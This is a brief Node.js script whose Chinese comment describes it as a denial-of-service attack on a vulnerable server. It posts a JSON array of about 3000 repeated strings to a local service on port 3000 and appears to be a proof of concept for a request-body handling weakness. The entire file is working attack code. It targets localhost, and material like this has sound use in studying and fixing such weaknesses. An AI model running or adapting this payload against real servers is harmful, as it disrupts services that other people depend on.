// 对脆弱的服务器展开拒绝服务攻击

var http = require('http');

var req = http.request({
    host: 'localhost',
    method: 'POST',
    port: 3000,
    headers: {
        'Content-Type': 'application/json'
    }
});

req.write('[');

var n = 3000;

while(n--) {
    req.write('"foo",');
}
req.write('"bar"]');

req.end();